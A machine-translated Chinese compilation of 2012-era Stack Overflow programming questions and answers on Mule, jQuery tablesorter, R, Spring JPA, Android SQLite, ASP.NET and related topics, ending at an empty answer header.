如果您想在公共库发生更改时自动重新加载播放应用程序，请确保子项目本身就是一个播放项目（只需要 /conf 文件夹和 /app 用于源代码）

# quartz-scheduler - Quartz 调度器的设置 - Mule

> ID：12460898
> 
> 赞同：0
> 
> 时间：2012-09-17T13:59:54.293
> 
> 标签：quartz-scheduler, mule, scheduler

我使用 Quartz 端点开发了一个 Mule(3.3) 应用程序，其中包含多个预定事件。我创建了一个 mule-config.xml 并将其部署在 Mule 服务器中，我可以看到在指定时间触发的事件。

现在，我需要实现一个功能，我可以在其中设置（在属性文件或 XML 文件中配置）来打开/关闭石英调度程序。ON 表示要触发的事件，OFF 表示不触发的事件。但我在 Mule 中看不到任何此类设置。

有关如何解决此问题的任何指示都会有所帮助。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:49:13.473

就个人而言，我不会尝试暂停/重新启动端点，而是让 Quartz 事件触发，但使用类似于此处讨论的内容关闭下游处理：[Mule 3：控制是否允许执行流](https://stackoverflow.com/questions/11885181/mule-3-controlling-whether-a-flow-is-allowed-to-be-executed)

# ios - match:shouldReinvitePlayer: 只适用于邀请赛？

> ID：12460908
> 
> 赞同：1
> 
> 时间：2012-09-17T14:00:22.800
> 
> 标签：ios, game-center, gamekit

我试图通过`match:shouldReinvitePlayer:`在我的 GKMatchDelegate 中提供调用来在我的游戏中实现一些基本的重新连接功能。

每次有人断开连接并返回 YES 时都会调用它，但只有当匹配是通过邀请而不是自动匹配创建时，断开连接的玩家才会真正获得新的邀请。

这是预期的（尽管未记录）行为，是否有一些技巧，或者可能只是 Game Center 的沙盒模式表现得很奇怪？

# jquery - 集成 jQuery 表格排序器、斑马条纹和行突出显示

> ID：12460912
> 
> 赞同：0
> 
> 时间：2012-09-17T14:00:31.737
> 
> 标签：jquery, highlight, tablesorter, zebra-striping

我已经尝试多次编写和重写，以保持简短，但包括“相关”背景。没有运气，所以我将给出当前情况并按要求回答问题。

我有两个问题，所以我把一个放在这篇文章中，另一个放在上一篇文章中。

我有一个动态表，它被硬编码到 tbody 标签。tbody 内的行由 AJAX 调用动态生成。

我需要能够（1）对表格进行斑马条纹；（2）对表格进行排序；(3) 突出显示当前悬停的行。我可以用 CSS 做斑马条纹，没问题。我也可以用 CSS 完成高亮行功能（在某种程度上）。

但是当实现表排序时（使用 jQuery 的表排序器），行不会“重新渲染”样式，所以我最终会得到浅灰色行和白色行的团块，而不是斑马条纹。

另外，当以这种方式接近时，行突出显示仅适用于白色行（未应用 CSS 类）。

我以为我上周找到了一些可以提供解决方案的文章，但我今天似乎找不到它们。我在网上找到的所有内容在实现或功能上都有一些不可接受的故障。

这是当前的代码：

```
$("#resultsTbody").html(response);
$("#resultsTbl").tablesorter();
var $rows = $(".stripeMe tbody tr");
$rows.hover(
  function() { $(this).addClass("currRow"); } // <--- error flagged here
  function() { $(this).removeClass("currRow"); }
); 
```

我得到的错误出现在指定的代码行上。错误是：

> SyntaxError: missing ) 在参数列表之后

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T17:49:31.373

我只是去`tr:nth-child`：

```
tr:nth-child(even) {background: #CCC}
tr:nth-child(odd) {background: #FFF}​ 
```

不需要JS。还有悬停：

```
 tr:hover{ cursor:pointer; background:#EEE} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-19T11:55:39.307

*** 我相信我已经解决了这个问题 *** 我相信我已经解决了这一切！

在我的 CSS 中添加了以下内容

```
.odd{ background: #DDDDDD; } 
.even{ background: #FFFFFF; } 
```

在小部件的一个不起眼的文档中发现了一点点。

然后我的脚本的其余部分是这样的

```
$(".stripeMe").tablesorter({ widgets: ['zebra'] });
var $rows = $(".stripeMe tbody tr"); 
$rows.hover( function(){ 
  $(this).addClass("currRow"); 
  $(this).css("cursor","pointer"); }, 
function(){ 
  $(this).removeClass("currRow");
  $(this).css("cursor","auto"); } 
); 
```

# r - 在R中应用PCA后如何重建原始数据矩阵

> ID：12460915
> 
> 赞同：0
> 
> 时间：2012-09-17T14:00:37.133
> 
> 标签：r, pca

`prcomp`我已经使用R中的函数对我的数据应用了 PCA 。

此函数返回以下内容：

1.  变化
2.  旋转矩阵
3.  标准差
4.  分数 (X)

我的问题是：例如，在选择两个主成分后，如何重建数据的简化版本？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:16:37.867

使用旋转矩阵在 PCA 和“正常”空间之间来回切换。只需仔细查看您最喜欢的多元统计书籍中 PCA 章节中的矩阵代数即可。要截断（或减少）您的数据集，只需将旋转矩阵限制为您想要的 PC 轴，例如前两个。

# c - Ruby C 扩展开发人员的命名约定

> ID：12460916
> 
> 赞同：11
> 
> 时间：2012-09-17T14:00:40.187
> 
> 标签：c, ruby

在用 C 语言编写 ruby​​ 扩展时，我有兴趣遵循正确的命名约定。具体来说，我指的是添加`_p`到谓词的函数名称和`m`为模块、`c`类等添加前缀的变量。

例如，如果我们想在 C 中定义如下的谓词方法，我们应该`_p`在定义该方法的函数中使用它作为后缀。

```
class MyClass
  def awesome?
    true
  end
end 
```

在 C 中：

```
static VALUE my_extension_my_class_awesome_p(VALUE self) {
  return Qtrue;
}

void Init_my_extension(void) {
  VALUE cMyClass = rb_define_class("MyClass", rb_cObject);

  rb_define_method(cMyClass,
                   "awesome?",
                   my_extension_my_class_awesome_p,
                   0);
} 
```

查看核心 Ruby 源代码，我看到`_p`(predicate) 和的后缀`_m`，我无法从中推断出含义。我敢肯定还有许多其他约定。

还有其他命名约定，例如何时使用下划线以及何时使用驼峰式大小写。在编写包含大量 C 代码的扩展时，如果没有可遵循的指导方针，很容易造成混乱。

某处有明确的清单吗？在搜索 Ruby C 扩展主题时，我似乎从未找到有用的结果。任何显示纯 Ruby 语法和正确命名的等效 C 函数的快速示例？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-23T08:47:31.657

这里还有更多： http: [//geoffgarside.co.uk/2007/05/20/ruby-c-extensions-nested-modules-classes/](http://geoffgarside.co.uk/2007/05/20/ruby-c-extensions-nested-modules-classes/)

Geoff Garside 有几十个用 ruby​​/C 编写的 repos。他是相当可信的IMO。[https://github.com/geoffgarside](https://github.com/geoffgarside)

当我找到更多时，我会继续寻找更多并编辑这篇文章。

**编辑**

看起来很难找到想要谈论 ruby​​ 扩展命名约定的人......也许你可以尝试向 M. Garside 发送推文/电子邮件。[他在推特](http://twitter.com/geoffgarside)上看起来很活跃。

# json - List[T] 类型的反序列化器

> ID：12460923
> 
> 赞同：1
> 
> 时间：2012-09-17T14:00:59.397
> 
> 标签：json, scala, playframework, playframework-2.0, deserialization

我正在尝试使用 Scala 将`JsArray`a 反序列化为`List[T]`playframework 应用程序中的 a 。经过一些研究，我发现这种方法应该可以完成所需的工作：

```
/**
 * Deserializer for List[T] types.
 */
implicit def listReads[T](implicit fmt: Reads[T]): Reads[List[T]] = new Reads[List[T]] {
  def reads(json: JsValue) = json match {
    case JsArray(ts) => ts.map(t => fromJson(t)(fmt)).toList
    case _ => throw new RuntimeException("List expected")
  }
} 
```

问题是我不知道如何使用它。欢迎任何帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T15:00:30.643

这是一个简单的例子：

```
scala> import play.api.libs.json._
import play.api.libs.json._

scala> Json.toJson(List(1, 2, 3)).as[List[Int]]
res0: List[Int] = List(1, 2, 3) 
```

如果您有一个带有`Format`实例的自定义类型：

```
case class Foo(i: Int, x: String)

implicit object fooFormat extends Format[Foo] {
  def reads(json: JsValue) = Foo(
    (json \ "i").as[Int],
    (json \ "x").as[String]
  )
  def writes(foo: Foo) = JsObject(Seq(
    "i" -> JsNumber(foo.i),
    "x" -> JsString(foo.x)
  ))
 } 
```

它仍然有效：

```
scala> val foos = Foo(1, "a") :: Foo(2, "bb") :: Nil
foos: List[Foo] = List(Foo(1,a), Foo(2,bb))

scala> val json = Json.toJson(foos)
json: play.api.libs.json.JsValue = [{"i":1,"x":"a"},{"i":2,"x":"bb"}]

scala> json.as[List[Foo]]
res1: List[Foo] = List(Foo(1,a), Foo(2,bb)) 
```

如果您的自定义类型有一个成员，这种方法也可以工作`xs: List[String]`，例如：您只需`(json \ "xs").as[List[String]]`在您的`reads`方法和`Json.toJson(foo.xs)`您的`writes`.

# kinect - 使用 Kinect 进行简单的运动跟踪（和坐标保存）

> ID：12460925
> 
> 赞同：0
> 
> 时间：2012-09-17T14:01:04.547
> 
> 标签：kinect

我正在寻找一个简单的 Kinect 应用程序，它允许我 a) 检测和 b) 在静态背景中跟踪单个移动对象。

我不需要任何花哨的骨架或其他特征，只需移动物体的质心即可。任何指针？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T01:51:00.960

我会看到[使用 Kinect 将保存的动作与其他动作进行比较](https://stackoverflow.com/questions/11438813/comparing-a-saved-movement-with-other-movement-with-kinect/11442334#11442334)以跟踪整个身体。答案显示了[此处](https://gist.github.com/3094082)的代码，该代码显示了如何保存骨架数据。如果您想跟踪关节而不是整个身体，则将椭圆映射到 kinect sdk 1.5 中的关节以跟踪关节（目前效果更好，但是当跟踪整个身体有效时，请使用它，因为它更有效[并且](https://stackoverflow.com/questions/11844585/mapping-an-ellipse-to-a-joint-in-kinect-sdk-1-5/11847704#11847704)高效的）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-26T02:50:38.517

您的情况非常简单，但需要对对象进行初始化，因为通常“对象”一词的定义不明确。它可以是最近的物体或移动的物体，甚至是被触摸的物体，具有一定的颜色、大小或形状。

假设您通过运动定义对象，即点云中的任何移动都是对象。我建议这样做：

*   如果对象移动超过其大小，则对象检测很容易，从那时
    起您只需减去深度图并最终得到您的对象：
    `depth1-depth2 > T`但是如果对象移动缓慢并且仅移动其大小的一小部分，则您必须使用任何高频信息有，可以是深度或颜色或两者兼而有之。如下图所示会很吵

![在此处输入图像描述](../Images/8a35258ba5af4fa5956a136909621bfe.png)

*   一旦你选择了你的对象，你可能想通过运行一些[形态过滤器](http://docs.opencv.org/modules/imgproc/doc/filtering.html?highlight=dilate#cv.Dilate)（侵蚀+扩张）来清除它以消除噪音并得到一个单一的斑点。之后，您只需要在 blob 中找到一些特征，例如平均深度或平均颜色，并在对象先前位置周围的小窗口中查找它们，以便重新发现对象；
*   最后不要忘记在对象移动时更新这些特征。

您可能想要使用的其他一些想法是：深度渐变、深度连接组件、预先记录背景深度以进行更清晰的减法、在通过鼠标单击选择的深度区域上运行 grabCut 等。

# spring - Spring EntityManager 不在独立应用程序中持续存在

> ID：12460930
> 
> 赞同：2
> 
> 时间：2012-09-17T14:01:23.123
> 
> 标签：spring, hibernate, entitymanager

我在让我的 EntityManager 将我的 @Entity 对象持久保存在我的独立应用程序中时遇到问题。没有错误，但没有任何内容被持久化到 HSQL 数据库中。我敢肯定这一定很愚蠢，但我现在对此束手无策。我已经搜索和搜索并尝试了一切，但我仍然无法让它工作。

appconfig.xml：

```
<bean id="entityManagerFactory"
class="org.springframework.orm.jpa.LocalEntityManagerFactoryBean" />
<bean id="productDaoImpl" class="test.ProductDao"/>
<bean
class="org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor" />
<bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
<property name="entityManagerFactory" ref="entityManagerFactory" />
</bean>

<tx:annotation-driven transaction-manager="transactionManager"/>
<context:component-scan base-package="test">
</context:component-scan> 
```

持久性.xml：

```
<persistence-unit name="test" transaction-type="RESOURCE_LOCAL">
<provider>org.hibernate.ejb.HibernatePersistence</provider>  
<properties>
<property name="hibernate.dialect" value="org.hibernate.dialect.HSQLDialect"/>
<property name="hibernate.hbm2ddl.auto" value="update"/>
<property name="hibernate.connection.driver_class" value="org.hsqldb.jdbcDriver"/>
<property name="hibernate.connection.username" value=""/>
<property name="hibernate.connection.password" value=""/>
<property name="hibernate.connection.url" value="jdbc:hsqldb:file://c:/db2"/>
</properties>
</persistence-unit>
</persistence> 
```

EntityObj.java：

```
package test;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.Id;
@Entity
public class EntityObj {
@Id
@GeneratedValue
private int id;
private String value;
public int getId() {
return id;
}
public void setId(int id) {
this.id = id;
}
public String getValue() {
return value;
}
public void setValue(String value) {
this.value = value;
}
} 
```

ProductDao.java:

```
package test;
import org.springframework.dao.DataAccessException;
public interface ProductDao {
public void save(EntityObj obj) throws DataAccessException;
} 
```

ProductDaoImpl.java:

```
package test;
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;
@Repository
@Transactional
public class ProductDaoImpl implements ProductDao {
@PersistenceContext
private EntityManager entityManager;
public EntityManager getEntityManager() {
return entityManager;
}
public void setEntityManager(EntityManager entityManager) {
this.entityManager = entityManager;
}
@Transactional (readOnly = false)
public void save(EntityObj obj)
{
try
{
entityManager.persist(obj);
entityManager.flush();
}
catch(Exception e)
{
e.printStackTrace();
}
}    
} 
```

主.java：

```
package test;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.FileSystemXmlApplicationContext;
public class Main {
public static void main(String[] args)
{
ApplicationContext springContext = new FileSystemXmlApplicationContext("classpath*:appconfig.xml");
ProductDao dao = (ProductDao) springContext.getBean("productDaoImpl");
EntityObj obj = new EntityObj();
obj.setValue("Blah");
dao.save(obj);
}
} 
```

没有任何错误，看起来它已经保存了 EntityObj，但没有任何内容保存在数据库中。我感觉它与事务相关，可能是由于我如何实例化对象，但我不确定。ENTITYOBJ 数据库表是自动创建的，只是没有数据。

# android - Android SQLite ORDER BY 在查询中不起作用

> ID：12460931
> 
> 赞同：1
> 
> 时间：2012-09-17T14:01:24.800
> 
> 标签：android, sqlite, sql-order-by

我有一个包含 6 个字段的数据库，我想做一个按“num”排序的查询

```
c=myDbHelper.query(m_db, new String[] {"_cod", "nombre", "flag", "cod_url", "tipo_l_menu", "num"}, null, null, null, null, "num"); 
```

有了这个，我得到了查询，但它没有排序。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T17:32:42.493

试试这个：

```
Cursor c = mydbhelper.rawQuery("SELECT * FROM myTable Order By num",null); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-06-17T22:14:47.613

请检查下面的代码它对我有用。

```
"SELECT  * FROM " +<Table-Name>+" ORDER BY cast(<enter Name of Column> as REAL) DESC/ASC;"; 
```

您可以按排序顺序获取数据

# c# - JSON 响应在 13355 个字符后拆分

> ID：12460936
> 
> 赞同：1
> 
> 时间：2012-09-17T14:01:48.107
> 
> 标签：c#, json, jquery, jsonp

我有一个返回 JSON 的 .NET 网络服务。我将它与来自我的小型 web 应用程序的 JSONP 调用一起使用。

一切都很好，直到响应达到一定大小。我能描述的最好的方法是，它会像下面这样分裂

> **jQuery16405120642159599811_1347881418555** ({"d":[{"RessourceId":1022,"Duration":3600,"StartDateTime":"/Date(1348030800000)/","Name":"SPINCLASS","Capacity":24,"Color ":"009900","ShowRessourceToMembersId":1,"ShowOtherBookingsToMembers":1,"FreeSpace":22,"Rooms":"ROOM1","Instructors":"NONE":0,"Description":"等等"}{{"RessourceId":1022,"Duration":3600,"StartDateTime":"/Date(1348030800000)/","Name":"SPINCLASS","Capacity":24,"Color":"009900" "ShowRessourceToMembersId":1,"ShowOtherBookingsToMembers":1,"FreeSpace":22,"Rooms":"ROOM1","Instructors":"NONE":0,"Description":"AND SO ON"}{ **CenterId");jQuery16405120642159599811_1347881418555(:909088** ,}...

所以在我的回复中，我插入了一个新的回调函数？它发生在大约 13355 个字符之后。

是什么原因造成的，我应该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T19:19:22.333

问题是如何在 Httpmodule jsonresponsefilter 中添加回调方法。当缓冲区被填满时，回调被添加到 write 方法中，这会导致问题。取而代之的是，它现在添加到了 flush 方法中，并且就像一个魅力。我从这里得到了答案，在底部的答案[Json HTTP Module stream issue](https://stackoverflow.com/questions/2430425/json-http-module-stream-issue)

# javascript - 未输入必填字段时，Asp.net 布局中断（搞砸我的布局）

> ID：12460937
> 
> 赞同：0
> 
> 时间：2012-09-17T14:01:49.640
> 
> 标签：javascript, asp.net, html, css

我有一个问题，我的布局似乎很古怪，我不知道为什么。这是我的布局：

```
<form id="form1" runat="server">
<input type="hidden" id="hidIsStrip" value="false" runat="server" />
<ajaxToolkit:ToolkitScriptManager ID="sm1" runat="server" EnablePageMethods="true" />
<div class="mainContentHolder">
    <h1>New IKS Server Credentials</h1>
    <asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Always">
        <ContentTemplate>
            <div id="rbfileByHolder" style="float:left; width:350px;" runat="server">
                <label>Sort By</label>
                <span><asp:RadioButton class="aspRBs" GroupName="rbfileByNameOrID" ID="rbMyFiles" Text="My Files"
                    runat="server" Checked="true" AutoPostBack="True" 
                    OnCheckedChanged="rbMyFiles_CheckedChanged" /></span>
                <span><asp:RadioButton class="aspRBs" GroupName="rbfileByNameOrID" id="rbByFileID"
                    Text="By File ID" runat="server" AutoPostBack="true"
                    oncheckedchanged="rbByFileID_CheckedChanged" /></span>
                <span><asp:RadioButton class="aspRBs" GroupName="rbfileByNameOrID" id="rbByFileName"
                    Text="By File Name" runat="server" AutoPostBack="true"
                    oncheckedchanged="rbByFileName_CheckedChanged" /></span>
            </div>
        </ContentTemplate>
    </asp:UpdatePanel>
    <asp:UpdatePanel ID="UpdatePanel2" runat="server" UpdateMode="Conditional">
        <ContentTemplate>
            <label>File</label>
            <asp:DropDownList runat="server" ID="ddlCaseFiles" DataSourceID="dsCaseFiles" 
                DataTextField="Display" DataValueField="FileID" OnPreRender="ddl_PreRender" 
                Height="20px" Width="400px" />
            <asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" 
                ControlToValidate="ddlCaseFiles" Display="Dynamic" ErrorMessage="*" 
                Title="Date Must Be Selected" />

            <br />
        </ContentTemplate>
        <Triggers>
            <asp:AsyncPostBackTrigger ControlID="rbByFileName" EventName="CheckedChanged" />
            <asp:AsyncPostBackTrigger ControlID="rbByFileID" EventName="CheckedChanged" />
            <asp:AsyncPostBackTrigger ControlID="rbMyFiles" EventName="CheckedChanged" />
        </Triggers>
    </asp:UpdatePanel>
    <label>Date Active</label>
    <input type="text" class="datepicker halfsizedInputs" id="dateActive" runat="server" />
    <asp:RequiredFieldValidator ErrorMessage="*" ControlToValidate="dateActive" Display="Dynamic" runat="server" Title="Date Must Be Selected" />
    <asp:RegularExpressionValidator ErrorMessage="*" ControlToValidate="dateActive" display="Dynamic" runat="server" ValidationExpression="^(19|20)\d\d[- /.](0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])$" ToolTip="Date Format: YYYY/MM/DD" />
    <label class="inlineLbl">Length of Purchase</label>
    <input type="text" class="halfsizedInputs" id="txtLengthPurchase" runat="server" />
    <br />
    <label>Username</label>
    <input class="halfsizedInputs" type="text" id="txtUserName" runat="server" />
    <label class="inlineLbl">Password</label>
    <input class="halfsizedInputs" type="text" id="txtPassword" runat="server" />
    <br />
    <label>IP/Domain</label>
    <input class="halfsizedInputs" type="text" id="txtIPDomain" runat="server" />
    <label class="inlineLbl">Port</label>
    <input class="halfsizedInputs" type="text" id="txtPort" runat="server" />
    <br />
    <label>DES</label>
    <input type="text" id="txtDES" runat="server" style="width:430px;" />
    <br />
    <label>Location being used</label>
    <asp:DropDownList runat="server" style="margin-right:10px; width:400px;" ID="ddlLocationUsed" DataSourceID="dsIKSLocationTypes" DataTextField="LocationType" DataValueField="IKSLocationBeingUsedID" OnPreRender="ddl_PreRender" />
    <a style="width:15px;" class="lnkNewPopUpStyles" id="NewLocationUsedType">New</a>
    <br />
    <label>Website</label>
    <input class="halfsizedInputs" type="text" id="txtWebsite" runat="server" />
    <label class="inlineLbl">Task ID Purchased</label>
    <input class="halfsizedInputs" type="text" id="txtTaskIDPurchased" runat="server" />
    <br />
    <label>Amount Paid</label>
    <input class="halfsizedInputs" type="text" id="txtAmountPaid" runat="server" />
    <asp:RangeValidator class="validation" ErrorMessage="*" ControlToValidate="txtAmountPaid" Display="Dynamic" runat="server" MinimumValue="0.01" Title="Amount must be positive" MaximumValue="100000000" Type="Currency" />
    <label class="inlineLbl">Payment Method</label>
    <asp:DropDownList ID="ddlPaymentType" Width="157px" runat="server" DataSourceID="dsPaymentTypes" DataTextField="PaymentType" DataValueField="PaymentTypeID" OnPreRender="ddl_PreRender" class="halfsizedInputs" />        
    <br />
    <label>Comments</label>
    <asp:TextBox ID="txtComment" runat="server" Height="70px" MaxLength="250" TextMode="MultiLine" Width="435px"></asp:TextBox>
    <asp:RequiredFieldValidator ErrorMessage="*" ControlToValidate="txtComment" Display="Dynamic" runat="server" Title="Comments required" />
    <br />

    <asp:Button ID="saveCredentials" Style="float: right; margin-right: 25px;" runat="server" Text="Save New Credentials" OnClick="saveCredentials_Click" OnClientClick="return checkValidation();" />
        <input id="btnAddFilesToServerCredentials" style="float:right;" runat="server" type="button" value="Add Photos" />

    <br />
    <div>
        <label>Attached Files</label>
        <div id="attachedFiles" runat="server"></div>
    </div><br />
    <asp:Label ID="lblIKSMessages" runat="server" Font-Bold="True" ForeColor="DarkRed"></asp:Label><br />
    <input id="retvalA" runat="server" type="hidden" />
    <input id="retvalB" runat="server" type="hidden" />
</div>
<div id="newddlLocation" style="display:none;">
    <label class="inlineLbl">Location</label>        
    <input type="text" id="txtNewLocation" />
</div>
<asp:HiddenField ID="hidCaseFileID" runat="server" />
<asp:SqlDataSource ID="dsIKSLocationTypes" runat="server" ConnectionString="<%$ ConnectionStrings:OSCIDConnectionString %>" ProviderName="System.Data.SqlClient" SelectCommand="p_Elements_GetIKSLocationTypes" SelectCommandType="StoredProcedure"></asp:SqlDataSource>
<asp:SqlDataSource ID="dsCaseFilesReverse" runat="server" ConnectionString="<%$ ConnectionStrings:OSCIDConnectionString %>" ProviderName="System.Data.SqlClient" SelectCommand="p_CaseFiles_ListActiveCaseFilesReverse" SelectCommandType="StoredProcedure"></asp:SqlDataSource>
<asp:SqlDataSource ID="dsCaseFiles" runat="server" ConnectionString="<%$ ConnectionStrings:OSCIDConnectionString %>" ProviderName="System.Data.SqlClient" SelectCommand="p_CaseFiles_ListActiveCaseFiles" SelectCommandType="StoredProcedure">
    <SelectParameters>
        <asp:SessionParameter Name="InvestigatorID" SessionField="InvestigatorID" />
    </SelectParameters>
</asp:SqlDataSource>
<asp:SqlDataSource ID="dsPaymentTypes" runat="server" ConnectionString="<%$ ConnectionStrings:OSCIDConnectionString %>"
    ProviderName="System.Data.SqlClient" SelectCommand="Select PaymentTypeID, PaymentType FROM ElementsPaymentTypes"></asp:SqlDataSource>
<asp:SqlDataSource ID="dsMyCaseFiles" runat="server" ConnectionString="<%$ ConnectionStrings:OSCIDConnectionString %>" ProviderName="System.Data.SqlClient" SelectCommand="p_CaseFiles_ListActiveCaseFilesAssignedTo" SelectCommandType="StoredProcedure">
    <SelectParameters>
        <asp:SessionParameter Name="InvestigatorID" SessionField="InvestigatorID" />
        <asp:SessionParameter Name="AssignedTo" SessionField="InvestigatorID" />
    </SelectParameters>
</asp:SqlDataSource>
</form> 
```

我遇到的问题是下拉列表旁边的标签“文件”不会与下拉列表显示在同一行。并且当必需字段被激活时。红星出现在标签“文件”和下拉列表之间，而不是在下拉列表之后。此外，当必填字段被激活时，标签“活动日期”往往会向上跳一行。所以它在下拉列表旁边结束。有什么建议么？我试过让列表更小。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:33:11.210

似乎只是`<br />`在标签修复一切之前添加。

# r - R读取一个zip数据文件而不解压缩它

> ID：12460938
> 
> 赞同：78
> 
> 时间：2012-09-17T14:01:56.810
> 
> 标签：r

我有一个非常大的 zip 文件，我正在尝试将其读入 R 而不像这样解压缩：

```
temp <- tempfile("Sales", fileext=c("zip"))
data <- read.table(unz(temp, "Sales.dat"), nrows=10, header=T, quote="\"", sep=",")

Error in open.connection(file, "rt") : cannot open the connection
In addition: Warning message:
In open.connection(file, "rt") :
  cannot open zip file 'C:\Users\xxx\AppData\Local\Temp\RtmpyAM9jH\Sales13041760345azip' 
```

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2012-10-18T08:59:22.260

如果您的 zip 文件被调用`Sales.zip`并且仅包含一个名为 的文件`Sales.dat`，我认为您可以简单地执行以下操作（假设该文件位于您的工作目录中）：

```
data <- read.table(unz("Sales.zip", "Sales.dat"), nrows=10, header=T, quote="\"", sep=",") 
```

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2016-03-16T21:11:15.187

无需使用 unz，因为现在 read.table 可以直接处理压缩文件：

```
data <- read.table("Sales.zip", nrows=10, header=T, quote="\"", sep=",") 
```

看到[这个帖子](https://stackoverflow.com/questions/25948777/extract-bz2-file-in-r)

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2017-09-15T11:38:00.677

[`readr`](https://github.com/tidyverse/readr)如果文件后缀表明文件的性质，即以 .gz、.bz2、.xz 或 .zip 结尾的文件将自动解压缩，则该软件包的方法也支持压缩文件。

```
require(readr)
myData <- read_csv("foo.txt.gz") 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2020-05-24T12:53:26.090

如果文件是 sales.csv，这应该可以正常工作。

```
data <- readr::read_csv(unzip("Sales.zip", "Sales.csv")) 
```

在不提取文件的情况下检查文件名。这有效

```
unzip("sales.zip", list = TRUE) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-08-09T00:03:04.417

在这个表达式中你丢失了一个点

```
temp <- tempfile("Sales", fileext=c("zip")) 
```

它应该是：

```
temp <- tempfile("Sales", fileext=c(".zip")) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-09-15T11:32:34.747

如果您的系统上安装了 zcat（linux、macos 和 cygwin 就是这种情况），您还可以使用：

```
zipfile<-"test.zip"
myData <- read.delim(pipe(paste("zcat", zipfile))) 
```

此解决方案还具有不创建临时文件的优点。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-07-06T02:43:58.220

gzfile 函数与 read_csv 和 read.table 一起可以读取压缩文件。

```
library(readr)
df = read_csv(gzfile("file.csv.gz"))

library(data.table)
df = read.table(gzfile("file.csv.gz")) 
```

即使不使用 gzfile 函数，readr 包中的 read_csv 也可以读取压缩文件。

```
library(readr)  
df = read_csv("file.csv.gz") 
```

推荐使用 read_csv，因为它比 read.table 快

# algorithm - 算法：按网格切割多边形

> ID：12460939
> 
> 赞同：7
> 
> 时间：2012-09-17T14:01:57.767
> 
> 标签：algorithm, grid, polygon

我有一个位于二维网格中的多边形：（
假设我能够绘制每条线之间的距离相同的网格）

![在此处输入图像描述](../Images/cf6859439a91740bfb0fafdafd985e6e.png)

我现在正在寻找一种算法或某种实现，可以将多边形沿着网格切割成几个较小的多边形。

C ++中的一些示例代码基本上显示了我想要做的事情：

```
struct Point2D
{
    double x;
    double y;
}

struct Polygon
{
    std::vector<Point2D> points;
}

/**
 * givenPolygon is the 'big' polygon which should be divided
 * gridSize is the distance between the gridlines
 * return value is a vector of the resulting subpolygons
 */
std::vector<Polygon> getSubpolygons( Polygon givenPolygon, double gridSize )
{
    Code here...
} 
```

是否有任何算法或实现的库可以做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:37:30.537

[General Polygon Clipper (GPC)](http://www.cs.man.ac.uk/~toby/gpc/)库将在这方面为您提供帮助。这是一个健壮可靠的算法：给它两个多边形并得到两者的交集。所以它并不能完全满足你的要求，但它肯定可以用来解决你的问题。例如迭代每个网格正方形。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-11T17:26:44.210

请参阅[增强几何](http://www.boost.org/doc/libs/1_54_0/libs/geometry/doc/html/geometry/reference/algorithms/intersection.html)。也许它可以帮助你。

# c# - ASP.NET 身份验证超时和注销事件

> ID：12460942
> 
> 赞同：1
> 
> 时间：2012-09-17T14:02:13.193
> 
> 标签：c#, asp.net, forms, authentication

根据我在谷歌搜索问题后的理解，ASP.NET 用于用户身份验证的身份验证票证会在设定的时间后过期，此时任何回发或页面加载都会导致用户被重定向到登录页面。但是，当票证超时时不会触发任何事件。因此，如果我想实现一个注销事件，它不会在票证到期时被触发。

我的问题是：有没有办法规避这个问题？我需要在用户注销我的网站时登录，但是如果票证超时并且用户被重定向到登录页面并认为他们已经注销所以他们只是关闭浏览器，我将永远不会记录何时他们注销。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:39:55.600

我通过将自定义对象放入 asp.net 缓存中看到了这种行为。您将缓存超时设置为与会话相同的时间范围，并在每次用户访问网站时刷新它。当缓存超时方法被触发时，您知道用户会话结束。

虽然这是一种肮脏的方法，应用程序可以重新启动，用户可以返回，会话结束，但这并不意味着用户已注销。

# python - 合并预先排序的文件而不将所有内容读入内存

> ID：12460943
> 
> 赞同：2
> 
> 时间：2012-09-17T14:02:13.917
> 
> 标签：python

我有一个日志文件列表，其中每个文件中的每一行都有一个时间戳，并且这些行在每个文件中按升序排序。不同的文件可以有重叠的时间范围，我的目标是将它们混合到一个大文件中，按时间戳排序。排序中可能存在联系，在这种情况下，我希望下一行来自输入列表中首先列出的任何文件。

我已经看到了如何使用`fileinput`（请参阅[此处](https://stackoverflow.com/questions/6653371/merging-and-sorting-log-files-in-python)）执行此操作的示例，但这似乎将所有文件读入内存。由于我的文件很大，这将是一个问题。因为我的文件是预先排序的，所以似乎应该有一种方法可以使用一种方法来合并它们，该方法只需要考虑每个文件中最近未探索的行。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-17T15:01:08.983

